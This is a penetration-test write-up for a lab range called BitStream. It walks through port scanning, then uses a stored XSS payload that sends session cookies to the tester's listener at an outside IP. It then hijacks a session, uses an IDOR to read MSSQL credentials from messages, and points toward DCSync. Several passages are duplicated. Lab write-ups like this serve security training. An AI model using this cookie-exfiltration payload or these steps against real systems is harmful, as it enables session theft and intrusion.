Range: BitStream

Range: BitStream

Objective

BitStream is a cloud storage provider that hosts sensitive data for enterprise clients. They have segmented their internal Active Directory environment (bitstream.hsm) and requested a full penetration test of their environment.
BitStream is a cloud storage provider that hosts sensitive data for enterprise clients. They have segmented their internal Active Directory environment (bitstream.hsm) and requested a full penetration test of their environment.

There is a web server running on 10.0.0.5. As shown in the diagram above, there are two internal subnets: 10.0.1.0/24 and 10.0.2.0/24. There are three hosts inside the first subnet:

10.0.1.5
10.0.1.6
10.0.1.7
10.0.1.5
10.0.1.6
10.0.1.7

And there is only one host inside the second subnet which is only reachable by the first subnet:

10.0.2.5
10.0.2.5

The domain name is bitstream.hsm. No credentials have been provided for this assessment.

Assessment

I started off by performing a TCP port scan across the three hosts in the first internal subnet:

I collected the hostnames and modified my /etc/hosts file by adding the following entries:

10.0.0.5   WEB.bitstream.hsm    WEB
10.0.1.5   SHARE.bitstream.hsm  SHARE
10.0.1.6   WKST.bitstream.hsm   WKST
10.0.1.7   SQL.bitstream.hsm    SQL
10.0.0.5   WEB.bitstream.hsm    WEB
10.0.1.5   SHARE.bitstream.hsm  SHARE
10.0.1.6   WKST.bitstream.hsm   WKST
10.0.1.7   SQL.bitstream.hsm    SQL

The scan result shows the share.bitstream.hsm has SMB, RDP, and WinRM ports open. The wkst.bitstream.hsm has RDP and WinRM ports only open. And the sql.bitstream.hsm has MSSQL, RDP, and WinRM ports open. None of these hosts have UDP ports open:

I notice this web.bitstream.hsm host has port 80 open.

I browsed to the web port and obtained the following webpage:

I noticed a section called Employee Login. After clicking on the button, I notice a Portal Login page for the employees:

However, I do not have valid credentials.

I noticed there is a page where customers can get quotes by filling in a form and the manager responds to it:

With no other point of entry, I decided to check this page further for XSS vulnerability and got a hit. The payload I used is the following:

<script>new Image().src="http://IP/log?c=" + encodeURIComponent(document.cookie);</script>
<script>new Image().src="http://IP/log?c=" + encodeURIComponent(document.cookie);</script>

On my machine, I started a Python web server on port 80 first:

┌──(kali㉿kali)-[~/Desktop/Labs/BitStream]
└─$ sudo python3 -m http.server 80 
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
┌──(kali㉿kali)-[~/Desktop/Labs/BitStream]
└─$ sudo python3 -m http.server 80 
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

Then using the payload above, I replaced it with my IP:

<script>new Image().src="http://192.168.211.2/log?c=" + encodeURIComponent(document.cookie);</script>
<script>new Image().src="http://192.168.211.2/log?c=" + encodeURIComponent(document.cookie);</script>

I inserted this payload inside the Company Name and Detailed Requirements fields and pressed the Submit Request button. After a few seconds, I obtained the session cookie:

As shown in the image above, the session cookie I obtained is the following (without the %3D which is the separator):

5d006381-a164-4a9b-a55d-f5585ad02d64
5d006381-a164-4a9b-a55d-f5585ad02d64

Then using the Developer Tools, I added the new cookie session:

The name of the cookie is session_id and its value is 5d006381-a164-4a9b-a55d-f5585ad02d64. After refreshing the page, I gained access to the internal web application as the user joey@bitstream.hsm:

I notice a section called Internal Inbox where the user joey is talking to Jon, Joey, and Tommy often:

I did not find anything useful inside these messages. However, looking at the source code of the web page, I notice the messages are stored in a linear sequential fashion:

As shown in the image above, the webpage successfully renders the messages of 3, 4, 5, 6, and it jumps to 10. Could this page be vulnerable to IDOR? After some checks, I notice the message 27 contains MSSQL credentials:

As shown in the image above, the MSSQL credentials are:

sql_svc:SQL_Svc_P@ss_99!
sql_svc:SQL_Svc_P@ss_99!

This svc_backup user has AdminCount set. This means it is a highly privileged account in the domain. When checking what groups this user belongs to, I notice it is a member of Remote Management Users and Backup Operators. I also notice this user has GetChangesAll and GetChanges over the bitstream.hsm domain:

This privilege allows svc_backup to perform DCSync attacks.
